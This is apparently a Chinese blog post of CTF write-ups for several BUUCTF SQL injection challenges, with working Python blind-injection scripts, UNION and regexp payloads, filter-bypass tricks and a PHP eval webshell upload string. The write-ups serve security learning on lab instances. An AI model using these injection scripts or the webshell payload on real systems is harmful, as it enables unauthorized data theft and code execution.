<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</a></p>
<p>寻找点，发现if其实没有被过滤（但是很多wp说被过滤了，后来经查证，字符多了才会被过滤2333）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;if(1&#x3D;1,1,2)</span><br><span class="line">Nu1L</span><br><span class="line">id&#x3D;if(1&#x3D;2,1,2)</span><br><span class="line"># V&amp;N</span><br><span class="line">id&#x3D;if(1&#x3D;1,3,2)</span><br><span class="line"># Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure>
<p>报错注入得到数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">give_grandpa_pa7pa_pa</span><br></pre></td></tr></table></figure>
<p>尝试使用information_schema获得表名，无效</p>
<p>根据wp，使用sys.x$schema_flattened_keys</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br></pre></td></tr></table></figure>
<p>得到表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
<p>接下来使用了字符串大小的判断来编写报错脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;8ec28565-2e76-4246-ba91-4641f78374a6.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">text &#x3D; &quot;V&amp;N&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">payload2 &#x3D; &quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">payload3 &#x3D; &quot;(select 1,&#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span><br><span class="line">for i in range(1, 600):</span><br><span class="line">	# print(&quot;debug&quot;)</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	high &#x3D; 128</span><br><span class="line">	while low &lt; high:</span><br><span class="line">		mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line">		# print(c)</span><br><span class="line">		str_temp &#x3D; ans + chr(mid)</span><br><span class="line"></span><br><span class="line">		payload_temp &#x3D; payload3.format(str_temp)</span><br><span class="line">		post_data &#x3D;&#123;</span><br><span class="line">			&quot;id&quot;: &quot;2||(&#123;&#125;)&quot;.format(payload_temp)</span><br><span class="line">		&#125;</span><br><span class="line">		response &#x3D; requests.post(url, data &#x3D; post_data)</span><br><span class="line">		print(response.text)</span><br><span class="line">		print(mid)</span><br><span class="line">		if text not in response.text:</span><br><span class="line">			high &#x3D; mid</span><br><span class="line">		else:</span><br><span class="line">			low &#x3D; mid + 1</span><br><span class="line">	if low &#x3D;&#x3D; 32 or high &#x3D;&#x3D; 128:</span><br><span class="line">		break</span><br><span class="line">	ans &#x3D; ans + chr(low - 1)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;9771B2DF-3F20-4E74-A4C6-B73CE4C9DEB9&#125; </span><br></pre></td></tr></table></figure>
<p>环境好像有些问题，提交不能通过。</p>
<h2 id="不使用information-schema获得表名的方法"><a href="#不使用information-schema获得表名的方法" class="headerlink" title="不使用information_schema获得表名的方法"></a>不使用information_schema获得表名的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()</span><br><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<h2 id="报错注入（无if版本）"><a href="#报错注入（无if版本）" class="headerlink" title="报错注入（无if版本）"></a>报错注入（无if版本）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select &#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
<p>会按照字符串大小来计算</p>
<h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>来源：NCTF2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/nctf2019sqliregexp-zhu/">https://guokeya.github.io/post/nctf2019sqliregexp-zhu/</a></p>
<p>首先进入页面，是一个登录框</p>
<p>fuzz一下，发现绝大多数的关键字都过滤了</p>
<p>此处还可以访问robots.txt，进而访问hint.txt，得到过滤黑名单</p>
<p>根据wp，regexp没过滤，故可构造基于regexp的报错注入语句</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://ee06d8fc-6daa-4c18-ba05-ac4293161510.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">string = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+string.digits</span><br><span class="line">text = <span class="string">&quot;welcome.php&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">	<span class="comment"># print(&quot;debug&quot;)</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	high = <span class="number">128</span></span><br><span class="line">	flag = <span class="literal">False</span></span><br><span class="line">	<span class="comment"># for j in range(low, high):</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">		<span class="comment"># print(c)</span></span><br><span class="line">		<span class="comment"># time.sleep(0.5)</span></span><br><span class="line">		str_temp = ans + j</span><br><span class="line">		post_data =&#123;</span><br><span class="line">			<span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">			<span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(str_temp,parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">		&#125;</span><br><span class="line">		response = requests.post(url, data = post_data)</span><br><span class="line">		<span class="comment"># print(response.text)</span></span><br><span class="line">		<span class="keyword">if</span> text <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="comment"># print(response.text)</span></span><br><span class="line">			ans = str_temp</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">			print(ans)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><strong>解释</strong></p>
<p>其中，关键语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &quot;\\&quot;,</span><br><span class="line">&quot;passwd&quot;: &#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;;&#123;&#125;&#39;.format(str_temp,parse.unquote(&#39;%00&#39;))</span><br></pre></td></tr></table></figure>
<p>因为对单引号进行了过滤，所以username处添加\，将其后的单引号过滤。且考虑到转译的原因，为”\\“</p>
<p>而passwd用到了三个知识点，一个是sql的内联注释/**/可以代替空格，一个是regexp的布尔盲注，一个是php中%00的截断（此处python的时候不能直接传入，会被解码为空）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39; # 从user()中判断是否有以r字母开头的值，有的话返回1</span><br></pre></td></tr></table></figure>
<p>还有一点需要注意的是，字符只能从_、数字、大小写字母中选取，要是直接以ascii码选取，会选到*，然后报错</p>
<p>得到密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you_will_never_Know7788990</span><br></pre></td></tr></table></figure>
<p>将其转换为小写（我也不知道为什么），提交后得到flag</p>
<h2 id="regexp布尔盲注"><a href="#regexp布尔盲注" class="headerlink" title="regexp布尔盲注"></a>regexp布尔盲注</h2><p>select user() regexp ‘^r’ # 从user()中判断是否有以r字母开头的值，有的话返回1</p>
<h2 id="单引号注入绕过"><a href="#单引号注入绕过" class="headerlink" title="单引号注入绕过"></a>单引号注入绕过</h2><p>使用\</p>
<h2 id="php截断"><a href="#php截断" class="headerlink" title="php截断"></a>php截断</h2><p>%00</p>
<p>有版本限制</p>
<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p>来源：SWPU2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43900387/article/details/103534108">https://blog.csdn.net/weixin_43900387/article/details/103534108</a></p>
<p>考察：mysql.innodb_table_stats，内联注释绕过空格</p>
<p>进入页面，有注册页面和登录页面</p>
<p>在注册页面处尝试进行updatexml的报错注入，由于回显只有登录时才会出现“登录失败”，报错注入较为复杂。尝试多次后，失败。</p>
<p>随便注册一个用户，进入页面后，有一个输入留言的位置</p>
<p>尝试在标题和内容都输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;database()</span><br></pre></td></tr></table></figure>
<p>成功。</p>
<p>点击查看留言，发现现实sql语句错误，说明标题行是有注入点的</p>
<p>麻烦的是此处用burp跑fuzz比较麻烦，且过滤了order by，行数特别多</p>
<p>看wp</p>
<p>爆列数，注意最后一个数22的单引号，用于闭合右单引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>报数据库类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>是mariaDB-log，它的mysql.innodb_table和mysq中的information_table.schema作用一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>得到表名，然后抽取表值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="绕过单引号的方法"><a href="#绕过单引号的方法" class="headerlink" title="绕过单引号的方法"></a>绕过单引号的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,&#39;22</span><br></pre></td></tr></table></figure>
<h2 id="maria-db下的“information-schema”"><a href="#maria-db下的“information-schema”" class="headerlink" title="maria_db下的“information_schema”"></a>maria_db下的“information_schema”</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>


<h1 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h1><p>来源：BJDCTF 2nd</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Fakebook">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Fakebook</a></p>
<p>进入页面，只有一个登录页面</p>
<p>随手将URL换成robots.txt，提示访问hint.txt</p>
<p>访问hint.txt，有如下提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;鍑洪浜哄洓绾у帇绾挎墠杩� 瑙佽皡瑙佽皡 棰嗕細绮剧</span><br></pre></td></tr></table></figure>
<p>乱码部分转换后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">出题人四级压线才? 见谅见谅 领会精神</span><br></pre></td></tr></table></figure>
<p>经测试，单引号被waf拦截，and被waf拦截</p>
<p>使用类似Web1的转译单引号绕过方法啊</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: 1\</span><br><span class="line">password: or&#x2F;**&#x2F;payload#</span><br></pre></td></tr></table></figure>
<p>后面不做了，就套模板。超参考链接的wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;c4a52ced-49ff-4797-b075-989df5c9ad7a.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;username&#39;: &#39;admin\\&#39;,</span><br><span class="line">    &#39;password&#39;: &#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line">flag &#x3D; &#39;BJD needs to be stronger&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">        payload &#x3D; &quot;or&#x2F;**&#x2F;if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        data[&#39;password&#39;] &#x3D; payload</span><br><span class="line"></span><br><span class="line">        rs &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">        if flag in rs.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line">    if low !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(low)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>得到一个字符串，在登录框用户名输入admin，密码输入该字符串，得到flag</p>
<h1 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h1><p>待做，考的知识点比较多</p>
<h1 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h1><p>来源：CISCN2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb</a></p>
<p><strong>失败的尝试</strong></p>
<p>打开网页，是一个登录界面</p>
<p>尝试一些简单注入，失败</p>
<p>访问robots.txt，提示每个php文件有bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>
<p>但是index.php的bak出不来</p>
<p>在firefox调试面板的网络中，发现登录页面的数据是交给user.php的，但是单独访问user.php是没有结果的</p>
<p>在登录界面，尝试输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or &#39;1&#39;&#x3D;&#39;1 #</span><br><span class="line">password: 123</span><br><span class="line"></span><br><span class="line">username: 123</span><br><span class="line">password: 456</span><br></pre></td></tr></table></figure>
<p>发现两者返回的图片不一样</p>
<p>再次打开页面查看器，发现img的标签是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;image.php?id&#x3D;2&quot; width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>直接访问image.php?id=1，是可以访问的</p>
<p><strong>正确wp</strong></p>
<p>下面参考别人的wp</p>
<p>使用dirmap扫描出有image.php.bak文件（这个不知道咋操作，一直因为too many request无法得出正确结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># image.php.bak</span></span><br><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
<p>发现，语句为”select * from images where id=’{$id}‘ or path=’{$path}’”</p>
<p>发现，使用了addslashes和str_replace</p>
<p>​    此处，addslashes是在斜杠\前再添加一个斜杠进行转译；而str_replace是把那四个字符替换为空</p>
<p>而目的是传入的id值最终为/，从而过滤掉之后的单引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;&#x2F;&#39; and path&#x3D;&#39;payload#&#39;</span><br></pre></td></tr></table></figure>
<p>因此id传入//0</p>
<p>之后不写了，抄wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eff1faa0-512a-48cd-afc2-155bb1119cb2.node3.buuoj.cn&#x2F;image.php?id&#x3D;\\0&amp;path&#x3D;&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">flag &#x3D; &quot;JFIF&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        mid &#x3D; (high + low) &gt;&gt; 1</span><br><span class="line">        response &#x3D; requests.get(url + payload.format(i, mid))</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line">    if low !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(low)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a59e57715afd21f67dbc</span><br></pre></td></tr></table></figure>
<p>wp说登录后是一个文件上传绕过，可使用短标签绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&lt;?&#x3D;@eval($_POST([&#39;a&#39;]));?&gt;</span><br></pre></td></tr></table></figure>
<p>这一步一直没连上，跳过</p>
<h1 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h1><p>来源：WUSTCTF2020</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb</a></p>
<p><strong>错误尝试</strong></p>
<p>单引号注入，双引号注入，扫描目录，查看源码，robots.txt</p>
<p><strong>正确方法</strong></p>
<p>不需要单引号注入啊直接写语句</p>
<p><img src=".%5Cpic%5CCTF-Web-SQL%E6%B3%A8%E5%85%A5-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2.png" alt="CTF-Web-SQL注入-颜值成绩查询"></p>
<p>后面的跳过，就是正常的那种布尔盲注</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" data-id="ckkdrz0z40006ugus6naj9ngh" data-title="CTF-Web-SQL注入" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
